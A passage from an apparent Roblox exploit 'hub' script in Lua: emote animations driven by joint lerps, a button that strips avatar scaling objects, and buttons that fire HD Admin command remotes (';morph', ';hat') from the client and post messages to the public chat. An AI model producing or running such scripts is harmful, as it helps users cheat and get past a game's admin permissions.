            RootJoint.C0 = RootJoint.C0:Lerp(cf(0.1 * sin(sine * 4), 0, 0) * euler(-1.5707963267948966, -0.08726646259971647 + 0.08726646259971647 * sin(sine * 4), -3.141592653589793), deltaTime) 
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * euler(1.5707963267948966, -1.6580627893946132 + 0.08726646259971647 * sin((sine - 0.2) * 4), 1.5707963267948966), deltaTime) 
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-1.5707963267948966, 0.04363323129985824 - 0.08726646259971647 * sin((sine + 0.1) * 4), -3.141592653589793), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(1, -1.1 + 0.1 * sin(sine * 4), 0) * euler(1.5707963267948966, 1.5707963267948966 + 0.08726646259971647 * sin(sine * 4), -1.5707963267948966), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -0.925 - 0.07 * sin(sine * 4), 0) * euler(1.5707963267948966, -1.7453292519943295 + 0.06981317007977318 * sin(sine * 4), 1.5707963267948966), deltaTime) 
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1 + 0.1 * sin((sine + 0.3) * 4), 1.4, 0) * euler(1.5707963267948966, 1.4835298641951802 - 0.2617993877991494 * sin((sine + 0.3) * 4), 1.5707963267948966), deltaTime) 
            --Fedora_Handle,8.657480066176504e-09,0,0,4,-6,0,0,4,-0.15052366256713867,0,0,4,0,0,0,4,-0.010221302509307861,0,0,4,0,0,0,4,Torso,0,0.1,0,4,-90,0,0,4,0,0,0,4,-5,5,0,4,0,0,0,4,-180,0,0,4,LeftArm,-1,0,0,4,90,0,0,4,0.5,0,0,4,-95,5,-0.2,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-90,0,0,4,1,0,0,4,2.5,-5,0.1,4,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,90,0,0,4,-1.1,0.1,0,4,90,5,0,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,90,0,0,4,-0.925,-0.07,0,4,-100,4,0,4,0,0,0,4,90,0,0,4,RightArm,1,0.1,0.3,4,90,0,0,4,1.4,0,0,4,85,-15,0.3,4,0,0,0,4,90,0,0,4
        
        elseif mode == "dab" then
            
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1.5, 0.5, 0) * euler(-1.7453292519943295, 0.17453292519943295 - 0.04363323129985824 * sin(sine * 2), -1.4835298641951802), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(1, -0.9000000953674316 - 0.1 * sin(sine * 2), 0) * euler(-1.3962634015954636, 1.3962634015954636, 1.5707963267948966), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1.0000001192092896 - 0.1 * sin(sine * 2), 0) * euler(-1.5707963267948966, -1.3962634015954636, -1.5707963267948966), deltaTime) 
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-2.0943951023931953 + 0.08726646259971647 * sin((sine - 1) * 2), -0.08726646259971647, 2.792526803190927), deltaTime) 
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 1.2000000476837158, 0) * euler(2.6179938779914944 + 0.08726646259971647 * sin((sine - 1) * 2), 0.6981317007977318, -1.3962634015954636), deltaTime) 
            RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0.1 * sin(sine * 2), 0) * euler(-1.6580627893946132, 0.08726646259971647, 3.0543261909900767), deltaTime) 
            --LeftArm,-1.5,0,0,2,-100,0,0,2,0.5,0,0,2,10,-2.5,0,2,0,0,0,2,-85,0,0,2,RightLeg,1,0,0,2,-80,0,0,2,-0.9000000953674316,-0.1,0,2,80,0,0,2,0,0,0,2,90,0,0,2,LeftLeg,-1,0,0,2,-90,0,0,2,-1.0000001192092896,-0.1,0,2,-80,0,0,2,0,0,0,2,-90,0,0,2,Fedora_Handle,8.657480066176504e-09,0,0,2,-6,0,0,2,-0.15052366256713867,0,0,2,0,0,0,2,-0.010221302509307861,0,0,2,0,0,0,2,Head,0,0,0,2,-120,5,-1,2,1,0,0,2,-5,0,0,2,0,0,0,2,160,0,0,2,RightArm,1,0,0,2,150,5,-1,2,1.2000000476837158,0,0,2,40,0,0,2,0,0,0,2,-80,0,0,2,Torso,0,0,0,2,-95,0,0,2,0,0.1,0,2,5,0,0,2,0,0,0,2,175,0,0,2
            
        elseif mode == "dance" then
            
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 1 + 0.5 * sin((sine + 0.078125) * 6.4), -0.5) * euler(-0.3490658503988659 + 1.0471975511965976 * sin((sine + 0.078125) * 6.4), -1.6580627893946132 + 0.6108652381980153 * sin((sine + 0.078125) * 6.4), -1.5707963267948966), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * euler(1.5707963267948966 - 0.17453292519943295 * sin((sine + 0.078125) * 6.4), 1.8325957145940461 + 0.2617993877991494 * sin(sine * 6.4), -1.5707963267948966), deltaTime) 
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-1.5882496193148399 + 0.17453292519943295 * sin((sine - 0.078125) * 6.4), 0.08726646259971647 + 0.17453292519943295 * sin((sine + 0.078125) * 6.4), 3.141592653589793), deltaTime) 
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5 + 0.15 * sin((sine + 0.546875) * 12.8), 0) * euler(1.9198621771937625 + 0.2617993877991494 * sin((sine + 0.546875) * 12.8), 1.6580627893946132 - 0.2617993877991494 * sin(sine * 6.4), -1.5707963267948966), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * euler(1.5707963267948966 - 0.12217304763960307 * sin((sine + 0.078125) * 6.4), -1.8325957145940461 + 0.2617993877991494 * sin(sine * 6.4), 1.5707963267948966), deltaTime) 
            RootJoint.C0 = RootJoint.C0:Lerp(cf(-0.6 * sin(sine * 6.4), 0, 0) * euler(-1.5882496193148399 + 0.08726646259971647 * sin((sine + 0.078125) * 6.4), -0.08726646259971647 * sin(sine * 6.4), 3.141592653589793 + 0.08726646259971647 * sin(sine * 6.4)), deltaTime) 
            --LeftArm,-1,0,0,6.4,-20,60,0.078125,6.4,1,0.5,0.078125,6.4,-95,35,0.078125,6.4,-0.5,0,0,6.4,-90,0,0,6.4,RightLeg,1,0,0,6.4,90,-10,0.078125,6.4,-1,0,0,6.4,105,15,0,6.4,0,0,0,6.4,-90,0,0,6.4,Head,0,0,0,6.4,-91,10,-0.078125,6.4,1,0,0,6.4,5,10,0.078125,6.4,0,0,0,6.4,180,0,0,6.4,RightArm,1,0,0,6.4,110,15,0.546875,12.8,0.5,0.15,0.546875,12.8,95,-15,0,6.4,0,0,0,6.4,-90,0,0,6.4,LeftLeg,-1,0,0,6.4,90,-7,0.078125,6.4,-1,0,0,6.4,-105,15,0,6.4,0,0,0,6.4,90,0,0,6.4,Fedora_Handle,8.657480066176504e-09,0,0,6.4,-6,0,0,6.4,-0.15052366256713867,0,0,6.4,0,0,0,6.4,-0.010221302509307861,0,0,6.4,-1,0,0,6.4,Torso,0,-0.6,0,6.4,-91,5,0.078125,6.4,0,0,0,6.4,-0,-5,0,6.4,0,0,0,6.4,180,5,0,6.4
            
        elseif mode == "T" then
            
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1.5, 0.5, 0) * euler(1.5707963267948966, 3.141592653589793, -1.5707963267948966), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * euler(0, 1.5707963267948966, 0), deltaTime) 
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1.5, 0.5, 0) * euler(1.5707963267948966, 3.141592653589793, 1.5707963267948966), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * euler(0, -1.5707963267948966, 0), deltaTime) 
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-1.5707963267948966, 0, -3.141592653589793), deltaTime) 
            RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0, 0) * euler(-1.5707963267948966, 0, -3.141592653589793), deltaTime) 
            --RightArm,1.5,0,0,1,90,0,0,1,0.5,0,0,1,180,0,0,1,0,0,0,1,-90,0,0,1,RightLeg,1,0,0,1,0,0,0,1,-1,0,0,1,90,0,0,1,0,0,0,1,0,0,0,1,Fedora_Handle,8.657480066176504e-09,0,0,1,-6,0,0,1,-0.15052366256713867,0,0,1,0,0,0,1,-0.010221302509307861,0,0,1,0,0,0,1,LeftArm,-1.5,0,0,1,90,0,0,1,0.5,0,0,1,180,0,0,1,0,0,0,1,90,0,0,1,LeftLeg,-1,0,0,1,-0,0,0,1,-1,0,0,1,-90,0,0,1,0,0,0,1,0,0,0,1,Head,0,0,0,1,-90,0,0,1,1,0,0,1,0,0,0,1,0,0,0,1,-180,0,0,1,Torso,0,0,0,1,-90,0,0,1,0,0,0,1,0,0,0,1,0,0,0,1,-180,0,0,1

        elseif mode == "float" then
            
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1.5 - 0.5 * sin((sine + 0.1) * 2), 0.5 + 0.5 * sin((sine - 0.5) * 2), 0) * euler(1.5707963267948966, 3.141592653589793 + 0.5235987755982988 * sin((sine - 1) * 2), -1.5707963267948966 - 0.2617993877991494 * sin(sine * 0.5)), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * euler(1.5707963267948966 - 0.17453292519943295 * sin(sine * 2), 1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.7) * 2), -1.5707963267948966), deltaTime) 
            RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 3 + 0.7 * sin((sine + 0.15) * 2), 0) * euler(-1.5707963267948966 + 0.08726646259971647 * sin((sine - 0.5) * 2), 0, -3.141592653589793 + 0.2617993877991494 * sin(sine * 0.5)), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * euler(1.5707963267948966 - 0.08726646259971647 * sin(sine * 2), -1.5707963267948966 + 0.08726646259971647 * sin((sine + 0.7) * 2), 1.5707963267948966), deltaTime) 
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1.5 + 0.5 * sin((sine + 0.1) * 2), 0.5 + 0.5 * sin((sine - 0.5) * 2), 0) * euler(1.5707963267948966, 3.141592653589793 - 0.5235987755982988 * sin((sine - 1) * 2), 1.5707963267948966 - 0.2617993877991494 * sin(sine * 0.5)), deltaTime) 
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-1.5707963267948966 - 0.17453292519943295 * sin((sine + 0.5) * 2), 0.17453292519943295 * sin(sine * 1), -3.141592653589793 + 0.5235987755982988 * sin(sine * 0.3)), deltaTime) 
            --RightArm,1.5,-0.5,0.1,2,90,0,0,2,0.5,0.5,-0.5,2,180,30,-1,2,0,0,0,2,-90,-15,0,0.5,Fedora_Handle,8.657480066176504e-09,0,0,2,-6,0,0,2,-0.15052366256713867,0,0,2,0,0,0,2,-0.010221302509307861,0,0,2,0,0,0,2,RightLeg,1,0,0,2,90,-10,0,2,-1,0,0,2,90,-5,0.7,2,0,0,0,2,-90,0,0,2,Torso,0,0,0,2,-90,5,-0.5,2,3,0.7,0.15,2,0,0,0,1,0,0,0,2,-180,15,0,0.5,LeftLeg,-1,0,0,2,90,-5,0,2,-1,0,0,2,-90,5,0.7,2,0,0,0,2,90,0,0,2,LeftArm,-1.5,0.5,0.1,2,90,0,0,2,0.5,0.5,-0.5,2,180,-30,-1,2,0,0,0,2,90,-15,0,0.5,Head,0,0,0,2,-90,-10,0.5,2,1,0,0,2,0,10,0,1,0,0,0,2,-180,30,0,0.3
            
        elseif mode == "floss" then
            
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-1.5707963267948966 + 0.04363323129985824 * sin((sine + 0.125) * 16), -0.2617993877991494 * sin((sine + 0.05) * 8), -3.141592653589793 + 0.5235987755982988 * sin(sine * 1.1)), deltaTime) 
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.9 + 0.4 * sin(sine * 8), 0.5, -0.5 * sin((sine - 0.35) * 4)) * euler(1.5707963267948966 + 0.6981317007977318 * sin(sine * 4), 1.5707963267948966 + 0.8726646259971648 * sin(sine * 8), -1.5707963267948966 + 0.17453292519943295 * sin((sine - 0.35) * 4)), deltaTime) 
            RootJoint.C0 = RootJoint.C0:Lerp(cf(-0.1 * sin((sine + 0.4) * 8), 0, 0) * euler(-1.5707963267948966, 0.3490658503988659 * sin(sine * 8), -3.141592653589793), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 - 0.4 * sin((sine - 0.01) * 8), 0) * euler(1.5707963267948966, -1.7453292519943295 + 0.5235987755982988 * sin(sine * 8), 1.5707963267948966), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 + 0.4 * sin((sine - 0.01) * 8), 0) * euler(1.5707963267948966, 1.7453292519943295 + 0.5235987755982988 * sin(sine * 8), -1.5707963267948966), deltaTime) 
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.9 + 0.4 * sin(sine * 8), 0.5, 0.5 * sin((sine + 0.25) * 4)) * euler(1.5707963267948966, -1.5707963267948966 + 0.8726646259971648 * sin(sine * 8), 1.5707963267948966 + 0.6981317007977318 * sin((sine + 0.25) * 4)), deltaTime) 
            --Head,0,0,0,8,-90,2.5,0.125,16,1,0,0,8,0,-15,0.05,8,0,0,0,8,-180,30,0,1.1,RightArm,0.9,0.4,0,8,90,40,0,4,0.5,0,0,8,90,50,0,8,0,-0.5,-0.35,4,-90,10,-0.35,4,Fedora_Handle,8.657480066176504e-09,0,0,8,-6,0,0,8,-0.15052366256713867,0,0,8,0,0,0,8,-0.010221302509307861,0,0,8,0,0,0,8,Torso,0,-0.1,0.4,8,-90,0,0,8,0,0,0,4,0,20,0,8,0,0,0,8,-180,0,0,8,LeftLeg,-1,0,0,8,90,0,0,8,-1,-0.4,-0.01,8,-100,30,0,8,0,0,0,8,90,0,0,8,RightLeg,1,0,0,8,90,0,0,8,-1,0.4,-0.01,8,100,30,0,8,0,0,0,8,-90,0,0,8,LeftArm,-0.9,0.4,0,8,90,0,0.25,4,0.5,0,0,8,-90,50,0,8,0,0.5,0.25,4,90,40,0.25,4
            
        elseif mode == "emote" then
            
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-1.5707963267948966, -0.4363323129985824 * sin(sine * 8), -3.141592653589793), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 + 0.3 * sin(sine * 8), 0) * euler(1.5707963267948966, 1.5707963267948966 + 0.5235987755982988 * sin(sine * 8), -1.5707963267948966), deltaTime) 
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.5, 1, 0) * euler(-0.5235987755982988, -1.5707963267948966 - 0.5235987755982988 * sin(sine * 8), 3.141592653589793), deltaTime) 
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.5, 1, 0) * euler(-0.5235987755982988, 1.5707963267948966 - 0.5235987755982988 * sin(sine * 8), 3.141592653589793), deltaTime) 
            RootJoint.C0 = RootJoint.C0:Lerp(cf(-0.1 * sin(sine * 8), 0.2 * sin((sine + 0.1) * 16), 0) * euler(-1.5707963267948966, 0.2617993877991494 * sin(sine * 8), -3.141592653589793), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 - 0.3 * sin(sine * 8), 0) * euler(1.5707963267948966, -1.5707963267948966 + 0.5235987755982988 * sin(sine * 8), 1.5707963267948966), deltaTime) 
            --Head,0,0,0,8,-90,0,0,8,1,0,0,8,0,-25,0,8,0,0,0,8,-180,0,0,8,RightLeg,1,0,0,8,90,0,0,8,-1,0.3,0,8,90,30,0,8,0,0,0,8,-90,0,0,8,LeftArm,-0.5,0,0,8,-30,0,0,8,1,0,0,8,-90,-30,0,8,0,0,0,8,180,0,0,8,RightArm,0.5,0,0,8,-30,0,0,8,1,0,0,16,90,-30,0,8,0,0,0,8,180,0,0,8,Torso,0,-0.1,0,8,-90,0,0,8,0,0.2,0.1,16,0,15,0,8,0,0,0,8,-180,0,0,8,LeftLeg,-1,0,0,8,90,0,0,8,-1,-0.3,0,8,-90,30,0,8,0,0,0,8,90,0,0,8,Fedora_Handle,8.657480066176504e-09,0,0,8,-6,0,0,8,-0.15052366256713867,0,0,8,0,0,0,8,-0.010221302509307861,0,0,8,0,0,0,8
            
        elseif mode == "pushups" then
            
            RootJoint.C0 = RootJoint.C0:Lerp(cf(0, -1.7 + 0.5 * sin(sine * 3.2), 0.3 * sin(sine * 3.2)) * euler(3.4033920413889427 + 0.17453292519943295 * sin(sine * 3.2), 0, 3.141592653589793), deltaTime) 
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1 - 0.25 * sin(sine * 3.2), 0.5 + 0.2 * sin(sine * 3.2), -0.75 * sin(sine * 3.2)) * euler(3.0543261909900767 - 0.17453292519943295 * sin(sine * 3.2), 1.3962634015954636 + 0.17453292519943295 * sin(sine * 3.2), -1.5707963267948966), deltaTime) 
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1 + 0.25 * sin(sine * 3.2), 0.5 + 0.2 * sin(sine * 3.2), -0.75 * sin(sine * 3.2)) * euler(3.0543261909900767 - 0.17453292519943295 * sin(sine * 3.2), -1.3962634015954636 - 0.17453292519943295 * sin(sine * 3.2), 1.5707963267948966), deltaTime) 
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-1.6580627893946132 + 0.17453292519943295 * sin((sine - 0.3125) * 3.2), 0, 3.141592653589793), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * euler(-1.5707963267948966, -1.7453292519943295, -1.5707963267948966), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * euler(1.5707963267948966, 1.3962634015954636, -1.5707963267948966), deltaTime) 
            --Torso,0,0,0,3.2,195,10,0,3.2,-1.7,0.5,0,3.2,-0,0,0,3.2,0,0.3,0,3.2,180,0,0,3.2,RightArm,1,-0.25,0,3.2,175,-10,0,3.2,0.5,0.2,0,3.2,80,10,0,3.2,0,-0.75,0,3.2,-90,0,0,0,LeftArm,-1,0.25,0,3.2,175,-10,0,3.2,0.5,0.2,0,3.2,-80,-10,0,3.2,0,-0.75,0,3.2,90,0,0,3.2,Head,0,0,0,3.2,-95,10,-0.3125,3.2,1,0,0,3.2,-0,0,0,3.2,0,0,0,3.2,180,0,0,3.2,LeftLeg,-1,0,0,3.2,-90,0,0,3.2,-1,0,0,3.2,-100,0,0,3.2,0,0,0,3.2,-90,0,0,3.2,RightLeg,1,0,0,3.2,90,0,0,3.2,-1,0,0,3.2,80,0,0,3.2,0,0,0,3.2,-90,0,0,3.2,Fedora_Handle,8.657480066176504e-09,0,0,3.2,-6,0,0,3.2,-0.15052366256713867,0,0,3.2,0,0,0,3.2,-0.010221302509307861,0,0,3.2,-1,0,0,3.2
            
        elseif mode == "kazotsky" then
            
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.5 - 0.15 * sin(sine * 6.4), 0.3, 0) * euler(2.792526803190927 + 0.08726646259971647 * sin(sine * 12.8), -0.17453292519943295 - 0.08726646259971647 * sin(sine * 6.4), 1.4835298641951802 - 0.08726646259971647 * sin(sine * 12.8)), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * euler(2.0943951023931953 - 0.8726646259971648 * sin(sine * 6.4), 1.6580627893946132 - 0.08726646259971647 * sin(sine * 6.4), -1.5707963267948966), deltaTime) 
            RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0.2 + 0.3 * sin((sine + 0.171875) * 12.8), 0) * euler(-1.4835298641951802 + 0.08726646259971647 * sin((sine + 0.15625) * 12.8), 0.08726646259971647 * sin(sine * 6.4), 3.141592653589793 + 0.17453292519943295 * sin(sine * 6.4)), deltaTime) 
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.5 - 0.15 * sin(sine * 6.4), 0.3, 0) * euler(2.792526803190927 + 0.08726646259971647 * sin(sine * 12.8), 0.17453292519943295 - 0.08726646259971647 * sin(sine * 6.4), -1.4835298641951802 + 0.08726646259971647 * sin(sine * 12.8)), deltaTime) 
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-1.5882496193148399 + 0.08726646259971647 * sin(sine * 12.8), -0.08726646259971647 * sin((sine + 0.15625) * 6.4), 3.141592653589793), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * euler(2.0943951023931953 + 0.8726646259971648 * sin(sine * 6.4), -1.6580627893946132 - 0.08726646259971647 * sin(sine * 6.4), 1.5707963267948966), deltaTime) 
            --LeftArm,-0.5,-0.15,0,6.4,160,5,0,12.8,0.3,0,0,6.4,-10,-5,0,6.4,0,0,0,6.4,85,-5,0,12.8,RightLeg,1,0,0,6.4,120,-50,0,6.4,-1,0,0,6.4,95,-5,0,6.4,0,0,0,6.4,-90,0,0,6.4,Fedora_Handle,8.657480066176504e-09,0,0,6.4,-6,0,0,6.4,-0.15052366256713867,0,0,6.4,0,0,0,6.4,-0.010221302509307861,0,0,6.4,-1,0,0,6.4,Torso,0,0,0,6.4,-85,5,0.15625,12.8,0.2,0.3,0.171875,12.8,-0,5,0,6.4,0,0,0,6.4,180,10,0,6.4,RightArm,0.5,-0.15,0,6.4,160,5,0,12.8,0.3,0,0,6.4,10,-5,0,6.4,0,0,0,6.4,-85,5,0,12.8,Head,0,0,0,6.4,-91,5,0,12.8,1,0,0,6.4,-0,-5,0.15625,6.4,0,0,0,6.4,180,0,0,6.4,LeftLeg,-1,0,0,6.4,120,50,0,6.4,-1,0,0,6.4,-95,-5,0,6.4,0,0,0,6.4,90,0,0,6.4
            
        elseif mode == "L" then
            
            RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0.25 + 0.25 * sin((sine + 0.25) * 8), 0) * euler(-1.5707963267948966, 0.17453292519943295 * sin(sine * 4), -3.141592653589793), deltaTime) 
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.7, 0.5, -0.3) * euler(1.7453292519943295, -0.8726646259971648, 1.5707963267948966), deltaTime) 
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-1.5707963267948966 + 0.04363323129985824 * sin((sine + 0.1) * 8), -0.17453292519943295 * sin((sine + 0.1) * 4), -3.141592653589793), deltaTime) 
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.7, 0.8, 0) * euler(1.0471975511965976 + 0.03490658503988659 * sin(sine * 8), 2.0943951023931953 + 0.10471975511965978 * sin((sine + 0.1) * 4), 1.5707963267948966), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * euler(2.2689280275926285 - 0.8726646259971648 * sin(sine * 4), 1.9198621771937625 - 0.3490658503988659 * sin(sine * 4), -1.5707963267948966), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * euler(2.2689280275926285 + 0.8726646259971648 * sin(sine * 4), -1.9198621771937625 - 0.3490658503988659 * sin(sine * 4), 1.5707963267948966), deltaTime) 
            --Torso,0,0,0,4,-90,0,0,4,0.25,0.25,0.25,8,0,10,0,4,0,0,0,4,-180,0,0,4,LeftArm,-0.7,0,0,4,100,0,0,4,0.5,0,0,4,-50,0,0,4,-0.3,0,0,4,90,0,0,4,Fedora_Handle,8.657480066176504e-09,0,0,4,-6,0,0,4,-0.15052366256713867,0,0,4,0,0,0,4,-0.010221302509307861,0,0,4,0,0,0,4,Head,0,0,0,4,-90,2.5,0.1,8,1,0,0,4,0,-10,0.1,4,0,0,0,4,-180,0,0,4,RightArm,0.7,0,0,4,60,2,0,8,0.8,0,0,4,120,6,0.1,4,0,0,0,4,90,0,0,4,RightLeg,1,0,0,4,130,-50,0,4,-1,0,0,4,110,-20,0,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,130,50,0,4,-1,0,0,4,-110,-20,0,4,0,0,0,4,90,0,0,4

        end
        
    end
end)
end)
Section8:NewButton("s-i-z-e-f-e", "r6,r15", function()
--script made by failedmite57926

local LocalPlayer = game:GetService("Players").LocalPlayer
local Character = LocalPlayer.Character
local Humanoid = Character:FindFirstChildOfClass("Humanoid")

function rm()
	for i,v in pairs(Character:GetDescendants()) do
		if v:IsA("BasePart") then
			if v.Name == "Handle" or v.Name == "Head" then
				if Character.Head:FindFirstChild("OriginalSize") then
					Character.Head.OriginalSize:Destroy()
				end
			else
				for i,cav in pairs(v:GetDescendants()) do
					if cav:IsA("Attachment") then
						if cav:FindFirstChild("OriginalPosition") then
							cav.OriginalPosition:Destroy()  
						end
					end
				end
				v:FindFirstChild("OriginalSize"):Destroy()
				if v:FindFirstChild("AvatarPartScaleType") then
					v:FindFirstChild("AvatarPartScaleType"):Destroy()
				end
			end
		end
	end
end

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyProportionScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyHeightScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("HeadScale"):Destroy()
wait(1)
end)
Section8:NewButton("potato coming soon", "r6,r15", function()
         local A_1 = ";morph me do"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
         local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
         local A_1 = ";char"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
local A_1 = ";hat me 4964938812 "
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(1)
local A_1 = ";hat me 29532720 "
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(2)
local A_1 = ";hat me 7133520069 "
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "failed;(";
        Text = "locked";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
        local args = {
    [1] = "coming soon",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section8:NewButton("sword 2 coming soon", "r6,r15", function()
    local A_1 = ";morph me do"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
    local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
    local A_1 = ";char"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
    game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "failed;(";
        Text = "locked";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
        local args = {
    [1] = "coming soon",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section8:NewButton("Void coming soon", "r6", function()
    local A_1 = ";morph me do"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
    local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
    local A_1 = ";char"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
    local A_1 = ";hat me 4794060642"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(1)
    local A_1 = ";hat me 5463681525"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(3)
    game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "failed;(";
        Text = "locked";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
        local args = {
    [1] = "coming soon",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section8:NewButton("ScArY DoLl coming soon! pendulum hub", "r6,7170689370 , 7218265043", function()
    local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(1)
    local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(3)
    local A_1 = ";char"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(6)
    local A_1 = ";hat me 4794060642"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(8)
end)
Section8:NewButton("Gon in pendulum hub", "r6", function()
local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
local A_1 = ";char"
